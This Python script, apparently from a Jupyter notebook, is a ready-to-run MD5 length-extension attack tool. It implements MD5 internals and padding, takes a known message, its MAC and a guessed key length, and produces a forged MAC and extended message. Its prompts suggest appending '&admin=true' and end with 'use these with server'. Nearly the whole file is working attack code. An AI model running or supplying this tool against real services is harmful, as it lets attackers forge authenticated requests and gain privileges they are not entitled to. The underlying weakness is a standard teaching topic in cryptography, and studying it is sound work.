#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import struct
import hashlib

class LengthExtensionClient:
    # MD5 internal functions
    @staticmethod
    def _rotl(val, shift):
        val &= 0xFFFFFFFF
        return ((val << shift) | (val >> (32 - shift))) & 0xFFFFFFFF

    @staticmethod
    def _func_F(x, y, z): return (x & y) | (~x & z)
    @staticmethod
    def _func_G(x, y, z): return (x & z) | (y & ~z)
    @staticmethod
    def _func_H(x, y, z): return x ^ y ^ z
    @staticmethod
    def _func_I(x, y, z): return y ^ (x | ~z)

    _SCHEDULE = [
        7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
        5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
        4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
        6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21,
    ]

    _CONSTS = [
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
        0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
        0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
        0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
        0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
        0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
        0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
        0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
        0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
        0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
        0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
        0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
        0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
        0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
    ]

    def _process_md5_block(self, chunk, A, B, C, D):
        a, b, c, d = A, B, C, D
        M = struct.unpack('<16I', chunk)
        for i in range(64):
            if i < 16:
                f = self._func_F(b, c, d)
                g = i
            elif i < 32:
                f = self._func_G(b, c, d)
                g = (5 * i + 1) % 16
            elif i < 48:
                f = self._func_H(b, c, d)
                g = (3 * i + 5) % 16
            else:
                f = self._func_I(b, c, d)
                g = (7 * i) % 16
            temp = (a + f + self._CONSTS[i] + M[g]) & 0xFFFFFFFF
            temp = self._rotl(temp, self._SCHEDULE[i])
            temp = (b + temp) & 0xFFFFFFFF
            a, d, c, b = d, c, b, temp
        return (
            (A + a) & 0xFFFFFFFF,
            (B + b) & 0xFFFFFFFF,
            (C + c) & 0xFFFFFFFF,
            (D + d) & 0xFFFFFFFF
        )

    @staticmethod
    def md5_pad(msg_len):
        pad = b'\x80'
        pad_len = (56 - (msg_len + 1) % 64) % 64
        pad += b'\x00' * pad_len
        bit_len = (msg_len * 8) & 0xffffffffffffffff
        pad += struct.pack('<Q', bit_len)
        return pad

    def perform_attack(self, secret_len, orig_msg, orig_mac, append_data):
        try:
            orig_msg_bytes = orig_msg.encode()
            append_bytes = append_data.encode()
            
            # Parse original hash into state variables
            h0 = struct.unpack('<I', bytes.fromhex(orig_mac[0:8]))[0]
            h1 = struct.unpack('<I', bytes.fromhex(orig_mac[8:16]))[0]
            h2 = struct.unpack('<I', bytes.fromhex(orig_mac[16:24]))[0]
            h3 = struct.unpack('<I', bytes.fromhex(orig_mac[24:32]))[0]

            # Generate forged message
            total_len = secret_len + len(orig_msg_bytes)
            glue_pad = self.md5_pad(total_len)
            forged_msg = orig_msg_bytes + glue_pad + append_bytes

            # Process final block to get new hash
            extended_len = total_len + len(glue_pad)
            final_len_bits = (extended_len + len(append_bytes)) * 8
            final_pad = b'\x80' + b'\x00' * ((56 - (len(append_bytes) + 1) % 64) % 64)
            final_pad += struct.pack('<Q', final_len_bits)

            # Process the final block
            current_state = [h0, h1, h2, h3]
            block_to_process = append_bytes + final_pad
            for i in range(0, len(block_to_process), 64):
                blk = block_to_process[i:i+64]
                current_state = self._process_md5_block(blk, *current_state)

            forged_mac = struct.pack('<IIII', *current_state).hex()
            return forged_mac, forged_msg
            
        except Exception as e:
            print(f"[ERROR] {str(e)}")
            return None

    def run(self):
        print("\n" + "="*50)
        print(" MD5 LENGTH EXTENSION ATTACK ".center(50, '='))
        
        orig_msg = input("\n[INPUT] Original message: ")
        orig_mac = input("[INPUT] Original MAC (hex): ")
        
        while True:
            try:
                secret_len = int(input("[INPUT] Key length guess: "))
                break
            except ValueError:
                print("[ERROR] Enter a number")

        append_data = input("[INPUT] Data to append(ex:&admin=true): ")

        print("\n" + "-"*50)
        print(" ATTACK PARAMETERS ".center(50, '-'))
        print(f"  Message: '{orig_msg}'")
        print(f"  MAC: {orig_mac}")
        print(f"  Append: '{append_data}'")
        print(f"  Key Length: {secret_len}")

        result = self.perform_attack(secret_len, orig_msg, orig_mac, append_data)
        if result:
            forged_mac, forged_msg = result
            print("\n" + "-"*50)
            print(" FORGED OUTPUT ".center(50, '-'))
            print(f"  New MAC: {forged_mac}")
            print(f"  New Message (hex): {forged_msg.hex()}")
            print("-"*50)
            print("\n[STATUS] Attack complete - use these with server")

if __name__ == "__main__":
    client = LengthExtensionClient()
    client.run()


# In[ ]:




